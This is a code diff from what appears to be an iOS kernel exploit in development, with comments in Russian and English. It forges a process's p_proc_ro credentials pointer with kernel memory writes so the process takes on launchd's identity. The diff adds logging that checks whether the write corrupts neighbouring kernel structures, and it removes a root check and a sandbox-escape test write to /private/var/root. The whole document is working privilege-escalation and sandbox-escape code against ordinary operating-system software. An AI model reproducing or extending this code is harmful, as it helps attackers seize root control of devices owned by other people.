@@ -1887,7 +1887,8 @@ static BOOL kpP1Verified(void)
     }
     gFrameTableVA = va;
     kpSetFrameTableVA(va);   // 1.9.177: frame-type гейт для walker'а (translation.c)
-    kpSetFrameTypeLogger(kpFrameTypeLogCb);   // 1.9.178b: census типов в syslog
+    // 2.0.148: do NOT enable frame-type census logger here — it fired on every
+    // walker lookup and drowned the E11 breadcrumb trail before a field reboot.
     return va;
 }
 
@@ -4497,9 +4498,15 @@ e10fail:
     //    дословный raw qword — сохранён выше для restore.
     kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (форж; оригинал raw=0x%016llx сохранён)",
               (unsigned long long)procRoSlot, (unsigned long long)forgeKVA, (unsigned long long)origProcRoRaw]);
-    // Clamped qword. kwritebuf→early_kwrite64 = 32-byte RMW — бьёт соседей proc.
+    // Snapshot proc head (p_list @+0) — 0x20 block RMW must not smash it.
+    uint64_t list0 = 0, list1 = 0;
+    (void)kpRead(selfProc + 0x0, &list0, 8, "proc+0", r);
+    (void)kpRead(selfProc + 0x8, &list1, 8, "proc+8", r);
+    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] before swap list0=%#llx list1=%#llx",
+              (unsigned long long)list0, (unsigned long long)list1]);
     {
         krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, forgeKVA, selfProc, 0x1000);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] zone_write(swap)=%d", (int)zv]);
         if (zv != KRW_ZONE_OK) {
             [r appendFormat:@"FAIL: zone_write(swap)=%d — не пишем\n", (int)zv];
             return r;
@@ -4508,34 +4515,29 @@ e10fail:
     didSwap = YES;
     rbRaw = 0;
     kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
+    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] swap readback=%#llx expect=%#llx",
+              (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
+    {
+        uint64_t l0b = 0, l1b = 0;
+        (void)kpRead(selfProc + 0x0, &l0b, 8, "proc+0 after", r);
+        (void)kpRead(selfProc + 0x8, &l1b, 8, "proc+8 after", r);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] after swap list0=%#llx list1=%#llx (delta=%@)",
+                  (unsigned long long)l0b, (unsigned long long)l1b,
+                  (l0b == list0 && l1b == list1) ? @"нет" : @"ЕСТЬ — RMW порвал p_list!"]);
+    }
     kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
               (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
     stuck = (rbRaw == forgeKVA);
 
     if (stuck) {
-        // 5. Verify: getuid() перечитывает proc_ro->p_ucred на каждый вызов
-        //    (доказано EXP-09) — с форжем это ucred launchd. P1 = uid AND euid.
-        //    Проба на unsandbox — запись в /private/var/root.
-        newUid = getuid();
-        newGid = getgid();
-        uidRoot = kpP1Verified();
-        kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d geteuid()=%d getgid()=%d%@",
-                  newUid, (int)geteuid(), newGid, uidRoot ? @" ← P1" : @""]);
-
-        const char *probePath = "/private/var/root/kexproof-e11-probe.txt";
-        errno = 0;
-        FILE *f = fopen(probePath, "w");
-        if (f) {
-            fputs("kexproof e11\n", f);
-            fclose(f);
-            unlink(probePath);
-            unsandboxOK = YES;
-            [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (ucred+label launchd)\n"];
-        }
-        else {
-            kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — %@", strerror(errno),
-                      uidRoot ? @"uid root, но sandbox/MAC ещё действует (label кеширован?)" : @"uid не root"]);
-        }
+        // 2.0.148: do NOT call getuid() while swapped (field: reboot class if
+        // launchd SMR ucred confuses cred lookup). Restore first; probe P1 only
+        // on a later opt-in pass.
+        kpNote(r, @"  [E11-STEP] verify SKIP getuid (2.0.148) — restore first");
+        newUid = (uid_t)-1;
+        newGid = (gid_t)-1;
+        uidRoot = NO;
+        unsandboxOK = NO;
     }
     else {
         [r appendString:@"FAIL: подмена не прилипла — kwrite по proc-зоне не работает\n"];
